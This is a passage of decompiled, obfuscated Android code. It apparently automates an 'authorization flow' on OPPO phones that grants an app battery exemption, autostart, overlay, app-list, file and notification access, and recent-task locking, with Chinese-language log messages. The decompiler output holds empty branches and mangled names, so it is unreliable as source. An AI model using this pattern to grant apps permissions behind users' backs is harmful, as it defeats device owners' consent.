                if (b81.m210571b1(j6, oppoStepsSimplified$execute$1) == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                str3 = "notification";
                str4 = "applist";
                int i20 = oppoStepsSimplified$execute$1.f54544a2;
                long j35 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a53 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                i = i20;
                j4 = j35;
                str6 = "autostart";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                oppoStepsSimplified$execute$1.f54543a1 = j4;
                oppoStepsSimplified$execute$1.f54544a2 = i;
                oppoStepsSimplified$execute$1.f54547a5 = 5;
                objM212324c2 = c0368a53.m212324c2(oppoStepsSimplified$execute$1);
                break;
            case 5:
                str3 = "notification";
                str4 = "applist";
                int i21 = oppoStepsSimplified$execute$1.f54544a2;
                long j36 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a53 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                str8 = "│ [重试] 先返回桌面...";
                i = i21;
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                obj3 = "%.2f";
                j4 = j36;
                str6 = "autostart";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                objM212324c2 = obj3;
                try {
                    try {
                        zBooleanValue = ((Boolean) objM212324c2).booleanValue();
                        String str25 = zBooleanValue ? "成功" : "失败";
                        StringBuilder sb4 = new StringBuilder();
                        sb4.append("└─── 电池设置");
                        sb4.append(str25);
                        sb4.append(" ───────────────────");
                        t60.m214704c5("OppoSteps", sb4.toString());
                    } catch (Exception e25) {
                        e = e25;
                        r4 = j4;
                        r8 = c0368a53;
                        r9 = obj3;
                        str = "秒)";
                        str2 = "ms (";
                        long jCurrentTimeMillis22222222222222222 = System.currentTimeMillis() - r4;
                        t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                        t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis22222222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis22222222222222222) / 1000.0d)}, 1)) + str);
                        oppoStepsSimplified$execute$1.f54542a0 = null;
                        oppoStepsSimplified$execute$1.f54547a5 = 29;
                        break;
                    }
                } catch (Exception e26) {
                    e = e26;
                    r4 = j4;
                    r8 = c0368a53;
                    r9 = obj3;
                    str = "秒)";
                    str2 = "ms (";
                    oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$12;
                    long jCurrentTimeMillis222222222222222222 = System.currentTimeMillis() - r4;
                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis222222222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis222222222222222222) / 1000.0d)}, 1)) + str);
                    oppoStepsSimplified$execute$1.f54542a0 = null;
                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                }
                oppoStepsSimplified$execute$12 = oppoStepsSimplified$execute$1;
                if (!zBooleanValue && !c0368a53.m212336d9("battery")) {
                    if (i < 1) {
                        t60.m214704c5("OppoSteps", "│ 电池设置未完成，准备重试...");
                    }
                    i++;
                    str20 = str9;
                    oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$12;
                    str7 = str8;
                    if (i < 2) {
                    }
                    str8 = str7;
                    str9 = str20;
                    j5 = c0368a53.f55125b4;
                    oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                    oppoStepsSimplified$execute$1.f54543a1 = j4;
                    oppoStepsSimplified$execute$1.f54547a5 = 6;
                    if (b81.m210571b1(j5, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$12;
                j5 = c0368a53.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                oppoStepsSimplified$execute$1.f54543a1 = j4;
                oppoStepsSimplified$execute$1.f54547a5 = 6;
                if (b81.m210571b1(j5, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                str3 = "notification";
                str4 = "applist";
                jCurrentTimeMillis = oppoStepsSimplified$execute$1.f54543a1;
                obj2 = oppoStepsSimplified$execute$1.f54542a0;
                try {
                    kg1.m213544f4(obj3);
                    obj3 = "%.2f";
                    str8 = "│ [重试] 先返回桌面...";
                    str6 = "autostart";
                    str9 = "╚═══════════════════════════════════════════════════════════╝";
                    str5 = "╔═══════════════════════════════════════════════════════════╗";
                    r8 = obj2;
                    i2 = 0;
                    c0368a5 = r8;
                    if (i2 >= 2) {
                    }
                    if (i5 >= 2) {
                    }
                    c0368a5 = r8;
                    if (i8 >= 2) {
                    }
                    r8 = r8;
                    if (i10 < 2) {
                    }
                    j15 = r8.f55125b4;
                    oppoStepsSimplified$execute$1.f54542a0 = r8;
                    oppoStepsSimplified$execute$1.f54543a1 = j12;
                    oppoStepsSimplified$execute$1.f54547a5 = 22;
                    if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                    }
                } catch (Exception e27) {
                    e = e27;
                    r9 = "%.2f";
                    r4 = jCurrentTimeMillis;
                    r8 = obj2;
                    str = "秒)";
                    str2 = "ms (";
                    long jCurrentTimeMillis2222222222222222222 = System.currentTimeMillis() - r4;
                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis2222222222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis2222222222222222222) / 1000.0d)}, 1)) + str);
                    oppoStepsSimplified$execute$1.f54542a0 = null;
                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                    break;
                }
                return coroutineSingletons;
            case 7:
                str3 = "notification";
                str4 = "applist";
                int i22 = oppoStepsSimplified$execute$1.f54544a2;
                long j37 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a526 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                c0368a54 = c0368a526;
                i2 = i22;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                jCurrentTimeMillis = j37;
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                long j272 = c0368a54.f55126b5;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a54;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54544a2 = i2;
                oppoStepsSimplified$execute$1.f54547a5 = 8;
                c0368a56 = c0368a54;
                break;
            case 8:
                str3 = "notification";
                str4 = "applist";
                i3 = oppoStepsSimplified$execute$1.f54544a2;
                long j38 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a53 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                j4 = j38;
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                oppoStepsSimplified$execute$1.f54543a1 = j4;
                oppoStepsSimplified$execute$1.f54544a2 = i3;
                oppoStepsSimplified$execute$1.f54547a5 = 9;
                objM212322c0 = c0368a53.m212322c0(oppoStepsSimplified$execute$1);
                if (objM212322c0 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 9:
                int i23 = oppoStepsSimplified$execute$1.f54544a2;
                str3 = "notification";
                str4 = "applist";
                long j39 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a53 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                str8 = "│ [重试] 先返回桌面...";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                objM212322c0 = obj3;
                obj3 = "%.2f";
                i4 = i23;
                j8 = j39;
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                r8 = c0368a53;
                zBooleanValue2 = ((Boolean) objM212322c0).booleanValue();
                if (!zBooleanValue2) {
                }
                StringBuilder sb5 = new StringBuilder();
                oppoStepsSimplified$execute$13 = oppoStepsSimplified$execute$1;
                sb5.append("└─── 自启动");
                sb5.append(str22);
                sb5.append(" ───────────────────");
                t60.m214704c5("OppoSteps", sb5.toString());
                if (!zBooleanValue2) {
                    if (i4 < 1) {
                    }
                    i2 = i4 + 1;
                    jCurrentTimeMillis = j8;
                    oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$13;
                    str6 = str19;
                    r8 = r8;
                    c0368a5 = r8;
                    if (i2 >= 2) {
                    }
                    if (i5 >= 2) {
                    }
                    c0368a5 = r8;
                    if (i8 >= 2) {
                    }
                    r8 = r8;
                    if (i10 < 2) {
                    }
                    j15 = r8.f55125b4;
                    oppoStepsSimplified$execute$1.f54542a0 = r8;
                    oppoStepsSimplified$execute$1.f54543a1 = j12;
                    oppoStepsSimplified$execute$1.f54547a5 = 22;
                    if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                jCurrentTimeMillis = j8;
                oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$13;
                c0368a5 = r8;
                j7 = c0368a5.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54547a5 = 10;
                if (b81.m210571b1(j7, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                long j40 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a55 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                str4 = "applist";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str3 = "notification";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                jCurrentTimeMillis = j40;
                c0368a57 = c0368a55;
                i5 = 0;
                if (i5 >= 2) {
                }
                c0368a5 = r8;
                if (i8 >= 2) {
                }
                r8 = r8;
                if (i10 < 2) {
                }
                j15 = r8.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = r8;
                oppoStepsSimplified$execute$1.f54543a1 = j12;
                oppoStepsSimplified$execute$1.f54547a5 = 22;
                if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                int i24 = oppoStepsSimplified$execute$1.f54544a2;
                long j41 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a527 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                c0368a57 = c0368a527;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                i6 = i24;
                str4 = "applist";
                str3 = "notification";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                jCurrentTimeMillis = j41;
                j10 = c0368a57.f55126b5;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54544a2 = i6;
                oppoStepsSimplified$execute$1.f54547a5 = 12;
                if (b81.m210571b1(j10, oppoStepsSimplified$execute$1) == coroutineSingletons) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                int i25 = oppoStepsSimplified$execute$1.f54544a2;
                long j42 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a58 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                i5 = i25;
                str4 = "applist";
                str3 = "notification";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                jCurrentTimeMillis = j42;
                c0368a57 = c0368a58;
                i7 = i5;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54544a2 = i7;
                oppoStepsSimplified$execute$1.f54547a5 = 13;
                objM212330c8 = c0368a57.m212330c8(oppoStepsSimplified$execute$1);
                if (objM212330c8 == coroutineSingletons) {
                }
                zBooleanValue3 = ((Boolean) objM212330c8).booleanValue();
                if (!zBooleanValue3) {
                }
                t60.m214704c5("OppoSteps", "└─── 悬浮窗" + (!zBooleanValue3 ? "成功" : "失败") + " ───────────────────");
                if (!zBooleanValue3) {
                }
                j9 = c0368a57.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54547a5 = 14;
                if (b81.m210571b1(j9, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                int i26 = oppoStepsSimplified$execute$1.f54544a2;
                long j43 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a528 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                objM212330c8 = obj3;
                str8 = "│ [重试] 先返回桌面...";
                c0368a57 = c0368a528;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                i7 = i26;
                str4 = "applist";
                str3 = "notification";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                jCurrentTimeMillis = j43;
                zBooleanValue3 = ((Boolean) objM212330c8).booleanValue();
                if (!zBooleanValue3) {
                }
                t60.m214704c5("OppoSteps", "└─── 悬浮窗" + (!zBooleanValue3 ? "成功" : "失败") + " ───────────────────");
                if (!zBooleanValue3) {
                }
                j9 = c0368a57.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54547a5 = 14;
                if (b81.m210571b1(j9, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                long j44 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a59 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                str4 = "applist";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str3 = "notification";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                jCurrentTimeMillis = j44;
                r8 = c0368a59;
                i8 = 0;
                c0368a5 = r8;
                if (i8 >= 2) {
                }
                r8 = r8;
                if (i10 < 2) {
                }
                j15 = r8.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = r8;
                oppoStepsSimplified$execute$1.f54543a1 = j12;
                oppoStepsSimplified$execute$1.f54547a5 = 22;
                if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                int i27 = oppoStepsSimplified$execute$1.f54544a2;
                long j45 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a529 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                c0368a510 = c0368a529;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                i8 = i27;
                str13 = "applist";
                str3 = "notification";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                jCurrentTimeMillis = j45;
                j13 = c0368a510.f55126b5;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a510;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54544a2 = i8;
                oppoStepsSimplified$execute$1.f54547a5 = 16;
                if (b81.m210571b1(j13, oppoStepsSimplified$execute$1) == coroutineSingletons) {
                }
                break;
            case 16:
                i9 = oppoStepsSimplified$execute$1.f54544a2;
                long j46 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a530 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                c0368a511 = c0368a530;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str13 = "applist";
                str3 = "notification";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                jCurrentTimeMillis = j46;
                i8 = i9;
                c0368a513 = c0368a511;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a513;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54544a2 = i8;
                oppoStepsSimplified$execute$1.f54547a5 = 17;
                objM212332d0 = c0368a513.m212332d0(oppoStepsSimplified$execute$1);
                r8 = c0368a513;
                break;
            case 17:
                int i28 = oppoStepsSimplified$execute$1.f54544a2;
                long j47 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a531 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                str8 = "│ [重试] 先返回桌面...";
                r8 = c0368a531;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                objM212332d0 = obj3;
                obj3 = "%.2f";
                str13 = "applist";
                i8 = i28;
                str3 = "notification";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                jCurrentTimeMillis = j47;
                try {
                    try {
                        zBooleanValue4 = ((Boolean) objM212332d0).booleanValue();
                        String str26 = zBooleanValue4 ? "成功" : "失败";
                        StringBuilder sb6 = new StringBuilder();
                        sb6.append("└─── 读取应用列表");
                        sb6.append(str26);
                        sb6.append(" ───────────────────");
                        t60.m214704c5("OppoSteps", sb6.toString());
                    } catch (Exception e28) {
                        e = e28;
                        r4 = jCurrentTimeMillis;
                        r9 = obj3;
                        str = "秒)";
                        str2 = "ms (";
                        long jCurrentTimeMillis22222222222222222222 = System.currentTimeMillis() - r4;
                        t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                        t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis22222222222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis22222222222222222222) / 1000.0d)}, 1)) + str);
                        oppoStepsSimplified$execute$1.f54542a0 = null;
                        oppoStepsSimplified$execute$1.f54547a5 = 29;
                        break;
                    }
                } catch (Exception e29) {
                    e = e29;
                    r4 = jCurrentTimeMillis;
                    r9 = obj3;
                    oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$14;
                    str = "秒)";
                    str2 = "ms (";
                    long jCurrentTimeMillis222222222222222222222 = System.currentTimeMillis() - r4;
                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis222222222222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis222222222222222222222) / 1000.0d)}, 1)) + str);
                    oppoStepsSimplified$execute$1.f54542a0 = null;
                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                }
                oppoStepsSimplified$execute$14 = oppoStepsSimplified$execute$1;
                if (!zBooleanValue4 && !r8.m212336d9(str13)) {
                    if (i8 < 1) {
                        t60.m214704c5("OppoSteps", "│ 读取应用列表未完成，准备重试...");
                    }
                    i8++;
                    oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$14;
                    str4 = str13;
                    r8 = r8;
                    c0368a5 = r8;
                    if (i8 >= 2) {
                    }
                    r8 = r8;
                    if (i10 < 2) {
                    }
                    j15 = r8.f55125b4;
                    oppoStepsSimplified$execute$1.f54542a0 = r8;
                    oppoStepsSimplified$execute$1.f54543a1 = j12;
                    oppoStepsSimplified$execute$1.f54547a5 = 22;
                    if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                oppoStepsSimplified$execute$1 = oppoStepsSimplified$execute$14;
                c0368a5 = r8;
                j11 = c0368a5.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54547a5 = 18;
                if (b81.m210571b1(j11, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 18:
                j12 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a512 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                str3 = "notification";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                r8 = c0368a512;
                i10 = 0;
                r8 = r8;
                if (i10 < 2) {
                }
                j15 = r8.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = r8;
                oppoStepsSimplified$execute$1.f54543a1 = j12;
                oppoStepsSimplified$execute$1.f54547a5 = 22;
                if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                int i29 = oppoStepsSimplified$execute$1.f54544a2;
                long j48 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a532 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                str3 = "notification";
                c0368a514 = c0368a532;
                j12 = j48;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                i10 = i29;
                j17 = c0368a514.f55126b5;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a514;
                oppoStepsSimplified$execute$1.f54543a1 = j12;
                oppoStepsSimplified$execute$1.f54544a2 = i10;
                oppoStepsSimplified$execute$1.f54547a5 = 20;
                if (b81.m210571b1(j17, oppoStepsSimplified$execute$1) == coroutineSingletons) {
                }
                break;
            case 20:
                int i30 = oppoStepsSimplified$execute$1.f54544a2;
                j14 = oppoStepsSimplified$execute$1.f54543a1;
                i11 = i30;
                c0368a515 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                str3 = "notification";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                c0368a517 = c0368a515;
                j12 = j14;
                i10 = i11;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a517;
                oppoStepsSimplified$execute$1.f54543a1 = j12;
                oppoStepsSimplified$execute$1.f54544a2 = i10;
                oppoStepsSimplified$execute$1.f54547a5 = 21;
                objM212326c4 = c0368a517.m212326c4(oppoStepsSimplified$execute$1);
                if (objM212326c4 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 21:
                int i31 = oppoStepsSimplified$execute$1.f54544a2;
                j16 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a533 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                str8 = "│ [重试] 先返回桌面...";
                str3 = "notification";
                r8 = c0368a533;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                objM212326c4 = obj3;
                i12 = i31;
                obj3 = "%.2f";
                zBooleanValue5 = ((Boolean) objM212326c4).booleanValue();
                if (!zBooleanValue5) {
                }
                t60.m214704c5("OppoSteps", "└─── 文件访问" + (!zBooleanValue5 ? "成功" : "失败") + " ───────────────────");
                if (!zBooleanValue5) {
                    if (i12 < 1) {
                    }
                    i10 = i12 + 1;
                    j12 = j16;
                    r8 = r8;
                    r8 = r8;
                    if (i10 < 2) {
                    }
                    j15 = r8.f55125b4;
                    oppoStepsSimplified$execute$1.f54542a0 = r8;
                    oppoStepsSimplified$execute$1.f54543a1 = j12;
                    oppoStepsSimplified$execute$1.f54547a5 = 22;
                    if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                j12 = j16;
                r8 = r8;
                j15 = r8.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = r8;
                oppoStepsSimplified$execute$1.f54543a1 = j12;
                oppoStepsSimplified$execute$1.f54547a5 = 22;
                if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 22:
                j12 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a516 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                str3 = "notification";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                r8 = c0368a516;
                i13 = 0;
                if (i13 < 2) {
                }
                j19 = j12;
                c0368a520 = r8;
                j20 = c0368a520.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a520;
                oppoStepsSimplified$execute$1.f54543a1 = j19;
                oppoStepsSimplified$execute$1.f54547a5 = 26;
                j23 = j19;
                c0368a521 = c0368a520;
                if (b81.m210571b1(j20, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 23:
                int i32 = oppoStepsSimplified$execute$1.f54544a2;
                long j49 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a534 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                c0368a518 = c0368a534;
                j12 = j49;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                i13 = i32;
                str16 = "notification";
                j22 = c0368a518.f55126b5;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a518;
                oppoStepsSimplified$execute$1.f54543a1 = j12;
                oppoStepsSimplified$execute$1.f54544a2 = i13;
                oppoStepsSimplified$execute$1.f54547a5 = 24;
                if (b81.m210571b1(j22, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 24:
                int i33 = oppoStepsSimplified$execute$1.f54544a2;
                long j50 = oppoStepsSimplified$execute$1.f54543a1;
                i14 = i33;
                c0368a519 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                j18 = j50;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                str16 = "notification";
                i15 = i14;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a519;
                oppoStepsSimplified$execute$1.f54543a1 = j18;
                oppoStepsSimplified$execute$1.f54544a2 = i15;
                oppoStepsSimplified$execute$1.f54547a5 = 25;
                objM212327c5 = c0368a519.m212327c5(oppoStepsSimplified$execute$1);
                if (objM212327c5 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 25:
                int i34 = oppoStepsSimplified$execute$1.f54544a2;
                long j51 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a535 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                str8 = "│ [重试] 先返回桌面...";
                r8 = c0368a535;
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                i16 = i34;
                j21 = j51;
                objM212327c5 = obj3;
                obj3 = "%.2f";
                str16 = "notification";
                zBooleanValue6 = ((Boolean) objM212327c5).booleanValue();
                if (!zBooleanValue6) {
                }
                StringBuilder sb22 = new StringBuilder();
                str18 = str21;
                sb22.append("└─── 通知管理");
                sb22.append(str23);
                sb22.append(" ───────────────────");
                t60.m214704c5("OppoSteps", sb22.toString());
                if (!zBooleanValue6) {
                    if (i16 < 1) {
                    }
                    i13 = i16 + 1;
                    str21 = str18;
                    str3 = str16;
                    j12 = j21;
                    r8 = r8;
                    if (i13 < 2) {
                    }
                    j19 = j12;
                    c0368a520 = r8;
                    j20 = c0368a520.f55125b4;
                    oppoStepsSimplified$execute$1.f54542a0 = c0368a520;
                    oppoStepsSimplified$execute$1.f54543a1 = j19;
                    oppoStepsSimplified$execute$1.f54547a5 = 26;
                    j23 = j19;
                    c0368a521 = c0368a520;
                    if (b81.m210571b1(j20, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                j19 = j21;
                c0368a520 = r8;
                j20 = c0368a520.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a520;
                oppoStepsSimplified$execute$1.f54543a1 = j19;
                oppoStepsSimplified$execute$1.f54547a5 = 26;
                j23 = j19;
                c0368a521 = c0368a520;
                if (b81.m210571b1(j20, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 26:
                long j52 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a536 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                j23 = j52;
                c0368a521 = c0368a536;
                t60.m214704c5("OppoSteps", "┌─── 最近任务锁定 ───────────────────");
